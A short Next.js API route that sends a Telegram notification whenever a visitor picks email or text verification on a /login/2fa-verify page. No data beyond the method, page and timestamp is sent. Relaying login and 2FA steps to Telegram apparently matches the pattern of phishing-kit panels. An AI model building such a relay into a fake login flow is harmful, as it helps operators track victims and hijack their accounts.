import { NextRequest, NextResponse } from "next/server"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const { method, page } = await request.json()
    const isEmail = method === "email"
    const telegramSuccess = await sendFormNotification({
      type: isEmail ? "email_verification" : "text_verification",
      page: page || `/login/2fa-verify?method=${method}`,
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
  } catch (error) {
    console.error("Error sending verification click notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
